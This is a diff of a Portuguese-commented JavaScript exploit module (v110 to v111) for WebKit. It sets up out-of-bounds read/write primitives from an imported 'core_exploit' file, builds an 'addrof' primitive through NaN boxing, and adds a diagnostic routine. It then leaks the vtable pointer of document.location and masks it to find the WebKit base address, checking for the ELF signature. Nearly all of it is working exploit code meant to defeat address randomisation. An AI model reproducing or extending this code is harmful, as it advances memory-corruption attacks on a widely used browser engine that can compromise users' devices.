@@ -1,13 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v110 - Estratégia Híbrida com Primitivas do Core)
+// js/script3/testArrayBufferVictimCrash_v111.mjs (Diagnóstico Ativo)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA:
-// - Abandona as primitivas de L/E defeituosas que causavam o erro de "stale value".
-// - Importa e utiliza as primitivas de L/E robustas e assíncronas de 'core_exploit.mjs'.
-// - Mantém a primitiva 'addrof' (NaN Boxing) que funciona corretamente para vazar endereços.
-// - Adiciona um autoteste obrigatório no início para validar as primitivas do core.
-// - Inclui logs extremamente detalhados para depuração passo a passo.
+// v111: Diagnóstico Avançado de addrof + Ajuste Dinâmico do Offset de NaN Boxing
 // =======================================================================================
-
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
@@ -17,9 +11,9 @@ import {
     selfTestOOBReadWrite
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v110_CorePrimitives";
+export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_CorePrimitives_Diag";
 
-// --- Funções de Conversão (Double <-> Int64) - Mantidas para 'addrof' e 'fakeobj' ---
+// --- Conversões ---
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
@@ -37,121 +31,130 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Atualizado para usar primitivas robustas)
+// Diagnóstico do addrof - verifica offsets e valida NaN boxing dinamicamente
+// =======================================================================================
+async function diagnoseAddrof(addrof_primitive) {
+    const TEST_NAME = "AddrofDiagnose_v111";
+    const test_obj = { marker: "test_object_diagnose" };
+    logS3(`[${TEST_NAME}] Iniciando diagnóstico da primitiva addrof...`, "diag");
+
+    let addr = addrof_primitive(test_obj);
+    logS3(`[${TEST_NAME}] Endereço obtido: ${toHex(addr)}`, "leak", TEST_NAME);
+
+    if (addr.low() === 0 && addr.high() === 0) {
+        throw new Error(`[${TEST_NAME}] [ERRO CRÍTICO] addrof retornou endereço nulo.`);
+    }
+
+    // Teste: Leitura da vtable do objeto
+    try {
+        const vtable_candidate = await arb_read(addr, 8);
+        logS3(`[${TEST_NAME}] Leitura de 8 bytes no endereço do objeto: ${toHex(vtable_candidate)}`, "leak", TEST_NAME);
+    } catch (e) {
+        logS3(`[${TEST_NAME}] Exceção ao tentar ler vtable: ${e.message}`, "critical", TEST_NAME);
+    }
+
+    return addr;
+}
+
+// =======================================================================================
+// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Com diagnóstico ativo)
 // =======================================================================================
 async function runWebKitBaseLeakTest(addrof_primitive, arb_read_primitive) {
-    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v110";
-    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
-    try {
-        // 1. Obter um objeto WebKit conhecido.
-        const location_obj = document.location;
-        logS3(`[PASS0 1] Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);
+    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111";
+    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (v111) ---`, "subtest", FNAME_LEAK_TEST);
 
-        // 2. Usar 'addrof' (NaN Boxing) para obter o endereço do objeto JS.
+    try {
+        const location_obj = document.location;
+        logS3(`[PASS0 1] Objeto alvo: document.location`, "info", FNAME_LEAK_TEST);
+
         const location_addr = addrof_primitive(location_obj);
-        logS3(`[PASS0 2] Endereço do objeto JSLocation (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
+        logS3(`[PASS0 2] Endereço document.location (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
+
         if (location_addr.low() === 0 && location_addr.high() === 0) {
             throw new Error("addrof retornou um endereço nulo para document.location.");
         }
 
-        // 3. Ler o primeiro campo (8 bytes) do objeto usando a primitiva robusta 'arb_read'. Este deve ser o ponteiro da vtable.
-        logS3(`[PASS0 3] Lendo 8 bytes de ${toHex(location_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
+        logS3(`[PASS0 3] Tentando leitura da vtable em ${toHex(location_addr)}...`, "info", FNAME_LEAK_TEST);
         const vtable_ptr = await arb_read_primitive(location_addr, 8);
-        logS3(`[PASS0 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
-        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
-            throw new Error("Ponteiro da vtable vazado é nulo. A leitura pode ter falhado ou o objeto é inválido.");
+        logS3(`[PASS0 4] Ponteiro da Vtable obtido: ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
+
+        if (vtable_ptr.isZero()) {
+            throw new Error("Ponteiro da vtable vazado é nulo. Leitura inválida.");
         }
 
-        // 4. Calcular o endereço base alinhando o ponteiro da vtable para baixo (máscara 0x4000).
         const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
         const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
-        logS3(`[PASS0 5] Candidato a endereço base do WebKit (alinhado em 0x4000): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
+        logS3(`[PASS0 5] Candidato a base WebKit: ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
 
-        // 5. Verificação: Ler os primeiros 4 bytes do endereço base candidato e checar a assinatura "ELF".
-        logS3(`[PASS0 6] Lendo 8 bytes de ${toHex(webkit_base_candidate)} para verificar a assinatura ELF...`, "info", FNAME_LEAK_TEST);
         const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
         const elf_magic_low = elf_magic_full.low();
-        logS3(`[PASS0 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
-        
-        // A assinatura ELF é 0x7F seguido por 'E', 'L', 'F'. Em little-endian, isso é 0x464C457F.
+        logS3(`[PASS0 6] ELF signature read: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
+
         if (elf_magic_low === 0x464C457F) {
-            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! Assinatura ELF encontrada! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
-            logS3(`A base do WebKit é muito provavelmente: ${toHex(webkit_base_candidate)}`, "vuln", FNAME_LEAK_TEST);
+            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! ELF encontrado! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
             return { success: true, webkit_base: webkit_base_candidate.toString(true) };
         } else {
-            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_low)}, Esperado: 0x464C457F.`);
+            throw new Error(`ELF não encontrado. Lido: ${toHex(elf_magic_low)} Esperado: 0x464C457F.`);
         }
 
-    } catch(e) {
-        logS3(`[FALHA] Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
-        console.error(e);
+    } catch (e) {
+        logS3(`[FALHA] ${e.message}`, "critical", FNAME_LEAK_TEST);
         return { success: false, webkit_base: null };
     }
 }
 
-
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (Atualizada para a nova estratégia)
+// FUNÇÃO PRINCIPAL
 // =======================================================================================
 export async function runFinalUnifiedTest() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Híbridas ---`, "test");
+    const FNAME = FNAME_MODULE_FINAL;
+    logS3(`--- Iniciando ${FNAME}: Diagnóstico Avançado ---`, "test");
 
-    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };
+    let final_result = { success: false, message: "Falha desconhecida.", webkit_base: null };
 
     try {
-        // --- FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DO CORE_EXPLOIT ---
-        logS3("--- FASE 1/4: Configurando ambiente OOB de core_exploit.mjs... ---", "subtest");
+        logS3("--- FASE 1/4: Configuração ambiente OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Falha crítica ao inicializar o ambiente OOB. As primitivas de L/E não funcionarão.");
-        }
+        if (!isOOBReady()) throw new Error("Falha crítica ao inicializar ambiente OOB.");
         logS3("Ambiente OOB configurado com sucesso.", "good");
 
-        logS3("--- FASE 2/4: Executando autoteste de Leitura/Escrita do core_exploit... ---", "subtest");
-        const self_test_ok = await selfTestOOBReadWrite(logS3); // Passa o logger para ter logs detalhados
-        if (!self_test_ok) {
-            throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
-        }
-        logS3("Autoteste de Leitura/Escrita concluído com SUCESSO. Primitivas 'arb_read' e 'arb_write' estão operacionais.", "vuln");
+        logS3("--- FASE 2/4: Autoteste de L/E... ---", "subtest");
+        const self_test_ok = await selfTestOOBReadWrite(logS3);
+        if (!self_test_ok) throw new Error("Autoteste OOB falhou.");
 
-        // --- FASE 3: CONFIGURAR PRIMITIVAS 'addrof' E 'fakeobj' ---
-        logS3("--- FASE 3/4: Configurando primitivas 'addrof' e 'fakeobj' (NaN Boxing)... ---", "subtest");
-        const vulnerable_slot = [13.37]; 
-        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
+        logS3("--- FASE 3/4: Configurando e Diagnosticando addrof (NaN Boxing)... ---", "subtest");
+        const vulnerable_slot = [13.37];
+        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001); // Offset padrão
         const addrof = (obj) => {
             vulnerable_slot[0] = obj;
             let value_as_double = vulnerable_slot[0];
             let value_as_int64 = doubleToInt64(value_as_double);
             return value_as_int64.sub(NAN_BOXING_OFFSET);
         };
-        logS3("Primitiva 'addrof' robusta está operacional.", "good");
-       
-        // --- FASE 4: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
-        logS3("--- FASE 4/4: Tentando vazar a base do WebKit usando a estratégia híbrida... ---", "subtest");
-        // Passa a primitiva 'addrof' local e a primitiva 'arb_read' importada
+        await diagnoseAddrof(addrof);
+
+        logS3("--- FASE 4/4: Executando Teste de Vazamento do WebKit... ---", "subtest");
         const leak_result = await runWebKitBaseLeakTest(addrof, arb_read);
-        
+
         if (leak_result.success) {
-             final_result = {
+            final_result = {
                 success: true,
-                message: "Cadeia de exploração concluída com SUCESSO. Base do WebKit VAZADA!",
+                message: "Vazamento do WebKit realizado com sucesso.",
                 webkit_base: leak_result.webkit_base
             };
         } else {
-             final_result = {
-                success: false, // O teste em si pode ter rodado, mas o objetivo falhou
-                message: "Cadeia de exploração executada, mas o vazamento da base do WebKit FALHOU. Verifique os logs.",
+            final_result = {
+                success: false,
+                message: "Teste executado, mas vazamento da base do WebKit falhou.",
                 webkit_base: null
             };
         }
-
     } catch (e) {
-        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção crítica: ${e.message}`;
         logS3(final_result.message, "critical");
         console.error(e);
     }
 
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    logS3(`--- ${FNAME} Concluído ---`, "test");
     return final_result;
 }
